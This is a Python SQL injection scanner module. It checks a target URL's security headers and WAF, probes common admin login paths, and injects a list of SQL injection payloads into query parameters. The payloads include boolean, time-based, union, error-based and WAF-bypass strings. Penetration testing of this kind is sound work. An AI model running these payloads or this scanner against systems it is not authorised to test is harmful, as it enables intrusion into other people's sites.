import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

ADMIN_PATHS = [
    "/admin/login.php", "/admin/index.php", "/wp-login.php",
    "/phpmyadmin/", "/administrator/", "/manager/",
    "/admin/admin.php", "/controlpanel.php", "/webadmin/"
]

SQLI_PAYLOADS = [
    # Basic payloads
    "'", "\"", 
    # Boolean-based
    "' OR '1'='1'-- -", 
    "' OR 1=1-- -",
    # Time-based
    "' OR SLEEP(5)-- -",
    # Union-based
    "' UNION SELECT 1,@@version,3-- -",
    # Error-based
    "' AND 1=CONVERT(int,(SELECT CURRENT_USER))--",
    # WAF bypass
    "'/*!50000OR*/1=1-- -"
]

def check_protections(response):
    """Check security headers and WAF presence"""
    protections = []
    security_headers = {
        'Content-Security-Policy': response.headers.get('Content-Security-Policy'),
        'X-Content-Type-Options': response.headers.get('X-Content-Type-Options'),
        'X-Frame-Options': response.headers.get('X-Frame-Options'),
        'Strict-Transport-Security': response.headers.get('Strict-Transport-Security')
    }
    
    for header, value in security_headers.items():
        if value:
            protections.append(f"{header}: Present")
    
    # WAF detection
    server_header = response.headers.get('Server', '').lower()
    if 'cloudflare' in server_header:
        protections.append("WAF Detected: Cloudflare")
    elif 'mod_security' in server_header:
        protections.append("WAF Detected: ModSecurity")
    
    return protections

def test_parameter(url, param):
    """Test a single parameter for SQL injection vulnerabilities"""
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Get baseline response
        baseline = requests.get(url, timeout=10, verify=False)
        base_time = baseline.elapsed.total_seconds()
        base_length = len(baseline.text)
        
        vulnerabilities = []
        
        for payload in SQLI_PAYLOADS:
            try:
                test_params = {k: [payload] if k == param else v for k, v in params.items()}
                target = urlunparse(  # CORRECTED PARENTHESES
                    parsed._replace(query=urlencode(test_params, doseq=True))
                )
                
                start = time.time()
                response = requests.get(target, timeout=15, verify=False)
                resp_time = time.time() - start
                
                # Detection logic
                if response.status_code >= 500:
                    return [f"{param} - Server Error (500+) with payload: {payload[:20]}..."]
                
                if resp_time > base_time + 4:
                    return [f"{param} - Time Delay ({resp_time:.1f}s) with payload: {payload[:20]}..."]
                
                if any(err in response.text.lower() for err in ['sql syntax', 'warning: mysql']):
                    return [f"{param} - Error Detected with payload: {payload[:20]}..."]
                    
            except requests.exceptions.Timeout:
                return [f"{param} - Timeout Occurred"]
            except:
                continue
        
        return vulnerabilities
    
    except Exception as e:
        return [f"Error testing {param}: {str(e)}"]

def perform_sqli_test(url):
    """Main SQL injection test function compatible with app.py"""
    report = []
    
    try:
        # Initial request for protections check
        response = requests.get(url, timeout=10, verify=False)
        protections = check_protections(response)
        
        report.append("🔒 SQL Injection Test Report")
        report.append("\n🛡️ Security Protections:")
        report.extend([f"  • {p}" for p in protections] if protections else ["  • No security protections detected"])
        
        # Check admin paths if no parameters
        parsed = urlparse(url)
        if not parsed.query:
            report.append("\n🔍 Admin Path Check:")
            found_paths = []
            for path in ADMIN_PATHS:
                try:
                    admin_url = f"{parsed.scheme}://{parsed.netloc}{path}"
                    if requests.head(admin_url, timeout=3, verify=False).status_code < 400:
                        found_paths.append(path)
                except:
                    continue
            report.extend([f"  • Found: {path}" for path in found_paths] if found_paths else ["  • No accessible admin paths found"])
        
        # Test parameters
        vulnerabilities = []
        params = parse_qs(parsed.query)
        for param in params:
            vulnerabilities.extend(test_parameter(url, param))
        
        # Build results
        if vulnerabilities:
            report.append("\n🚨 Vulnerabilities Found:")
            report.extend([f"  • {vuln}" for vuln in vulnerabilities])
        else:
            report.append("\n✅ No SQL injection vulnerabilities detected")
    
    except Exception as e:
        return f"❌ Scan failed: {str(e)}"
    
    return "\n".join(report)